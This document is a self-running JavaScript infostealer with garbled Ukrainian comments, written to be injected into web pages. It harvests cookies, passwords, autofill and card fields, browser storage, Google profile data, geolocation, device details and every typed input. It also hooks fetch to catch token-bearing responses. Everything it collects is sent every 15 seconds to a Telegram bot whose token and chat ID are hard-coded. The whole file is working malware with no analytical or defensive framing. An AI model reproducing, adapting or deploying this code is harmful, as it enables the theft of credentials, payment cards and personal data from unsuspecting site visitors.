(function(){
    // –ö–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è –∑ –≤–∞—à–∏–º–∏ –¥–∞–Ω–∏–º–∏
    const BOT_TOKEN = '8101956095:AAF72VNrqd9Jxlz0nBL5LqmKgveEPh7b75Q';
    const CHAT_ID = '8463942433';
    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    // –ö—Ä–æ–∫ 1A: –ú–∏—Ç—Ç—î–≤–∞ —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è –±–µ–∑ –∑–∞—Ç—Ä–∏–º–æ–∫
    window.__collected = [];
    window.__stolen_data = {};

    // –ö—Ä–æ–∫ 1B: –§—É–Ω–∫—Ü—ñ—è –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ –≤ Telegram
    const sendToTelegram = (data) => {
        try {
            const message = encodeURIComponent('üî• –ù–û–í–Ü –î–ê–ù–Ü üî•\n' + JSON.stringify(data, null, 2));
            navigator.sendBeacon(TELEGRAM_API + `?chat_id=${CHAT_ID}&text=${message}`);
            
            // –î—É–±–ª—é–≤–∞–Ω–Ω—è —á–µ—Ä–µ–∑ fetch
            fetch(TELEGRAM_API, {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: `chat_id=${CHAT_ID}&text=${message}&parse_mode=HTML`
            }).catch(e => {});
        } catch(e) {}
    };

    // –ö—Ä–æ–∫ 1C: –ó–±—ñ—Ä –≤—Å—ñ—Ö Google cookies
    const stealAllCookies = () => {
        try {
            document.cookie.split(';').forEach(cookie => {
                window.__collected.push(['COOKIE', cookie.trim()]);
            });
        } catch(e) {}
    };

    // –ö—Ä–æ–∫ 2A: –ó–±—ñ—Ä –ø–∞—Ä–æ–ª—ñ–≤ –∑ —Ñ–æ—Ä–º
    const stealAllPasswords = () => {
        try {
            const inputs = document.querySelectorAll('input[type="password"]');
            inputs.forEach(input => {
                if (input.value) window.__collected.push(['PASSWORD', input.value, input.name]);
            });
        } catch(e) {}
    };

    // –ö—Ä–æ–∫ 2B: –ó–±—ñ—Ä –≤—Å—ñ—Ö –¥–∞–Ω–∏—Ö –∞–≤—Ç–æ–∑–∞–ø–æ–≤–Ω–µ–Ω–Ω—è
    const stealAllAutofill = () => {
        try {
            const inputs = document.querySelectorAll('input, textarea, select');
            inputs.forEach(input => {
                if (input.value && input.value.length > 1) {
                    window.__collected.push(['AUTOFILL', input.name, input.value, input.type]);
                }
            });
        } catch(e) {}
    };

    // –ö—Ä–æ–∫ 2C: –ü–æ–≤–Ω–∏–π –∑–±—ñ—Ä localStorage
    const stealAllStorage = () => {
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                window.__collected.push(['LOCAL_STORAGE', key, localStorage.getItem(key)]);
            }
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                window.__collected.push(['SESSION_STORAGE', key, sessionStorage.getItem(key)]);
            }
        } catch(e) {}
    };

    // –ö—Ä–æ–∫ 3A: –ó–±—ñ—Ä Google –∞–∫–∫–∞—É–Ω—Ç–∞
    const stealGoogleAccount = () => {
        try {
            if (window.gapi && window.gapi.auth2) {
                window.gapi.auth2.getAuthInstance().then(auth => {
                    const user = auth.currentUser.get();
                    const profile = user.getBasicProfile();
                    window.__collected.push(['GOOGLE_PROFILE', {
                        name: profile.getName(),
                        email: profile.getEmail(),
                        image: profile.getImageUrl(),
                        id: profile.getId()
                    }]);
                });
            }
        } catch(e) {}
    };

    // –ö—Ä–æ–∫ 3B: –ü–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–Ω—è –≤—Å—ñ—Ö –º–µ—Ä–µ–∂–µ–≤–∏—Ö –∑–∞–ø–∏—Ç—ñ–≤
    const interceptAllRequests = () => {
        const originalFetch = window.fetch;
        window.fetch = function(...args) {
            return originalFetch.apply(this, args).then(response => {
                response.clone().text().then(text => {
                    if (text.includes('token') || text.includes('auth') || text.includes('password')) {
                        window.__collected.push(['NETWORK_REQUEST', args[0], text.substring(0, 500)]);
                    }
                });
                return response;
            });
        };
    };

    // –ö—Ä–æ–∫ 3C: –ó–±—ñ—Ä –∫—Ä–µ–¥–∏—Ç–Ω–∏—Ö –∫–∞—Ä—Ç
    const stealCreditCards = () => {
        try {
            const ccInputs = document.querySelectorAll('input[autocomplete*="cc"], input[name*="card"]');
            ccInputs.forEach(input => {
                if (input.value) window.__collected.push(['CREDIT_CARD', input.name, input.value]);
            });
        } catch(e) {}
    };

    // –ö—Ä–æ–∫ 4A: –ó–±—ñ—Ä –≥–µ–æ–ª–æ–∫–∞—Ü—ñ—ó
    const stealLocation = () => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => {
                    window.__collected.push(['GEOLOCATION', 
                        pos.coords.latitude, 
                        pos.coords.longitude
                    ]);
                },
                err => {},
                {timeout: 5000}
            );
        }
    };

    // –ö—Ä–æ–∫ 4B: –ó–±—ñ—Ä —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ –ø—Ä–∏—Å—Ç—Ä—ñ–π
    const stealDeviceInfo = () => {
        window.__collected.push(['DEVICE_INFO', {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            cookies: navigator.cookieEnabled,
            java: navigator.javaEnabled()
        }]);
    };

    // –ö—Ä–æ–∫ 4C: –ú–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥ –≤–≤–µ–¥–µ–Ω–Ω—è –¥–∞–Ω–∏—Ö
    const monitorInputs = () => {
        document.addEventListener('input', (e) => {
            if (e.target.value && e.target.value.length > 3) {
                window.__collected.push(['KEYSTROKE', e.target.name, e.target.value]);
            }
        }, true);
    };

    // –ö—Ä–æ–∫ 5A: –û—Å–Ω–æ–≤–Ω–∏–π –ø—Ä–æ—Ü–µ—Å –∑–±–æ—Ä—É
    const startCollection = () => {
        stealAllCookies();
        stealAllPasswords();
        stealAllAutofill();
        stealAllStorage();
        stealGoogleAccount();
        interceptAllRequests();
        stealCreditCards();
        stealLocation();
        stealDeviceInfo();
        monitorInputs();

        // –í—ñ–¥–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–∏—Ö –∫–æ–∂–Ω—ñ 15 —Å–µ–∫—É–Ω–¥
        setInterval(() => {
            if (window.__collected.length > 0) {
                sendToTelegram(window.__collected);
                window.__collected = [];
            }
        }, 15000);

        // –û–¥–Ω–æ—Ä–∞–∑–æ–≤–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫–∞ —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥–∏
        setTimeout(() => {
            sendToTelegram(['INITIAL_COLLECTION_COMPLETE', window.location.href]);
        }, 3000);
    };

    // –ö—Ä–æ–∫ 5B: –ó–∞–ø—É—Å–∫ –Ω–µ–≥–∞–π–Ω–æ
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', startCollection);
    } else {
        startCollection();
    }

    // –ö—Ä–æ–∫ 5C: –†–µ–∑–µ—Ä–≤–Ω–∏–π –∑–∞–ø—É—Å–∫
    setTimeout(startCollection, 1000);
})();
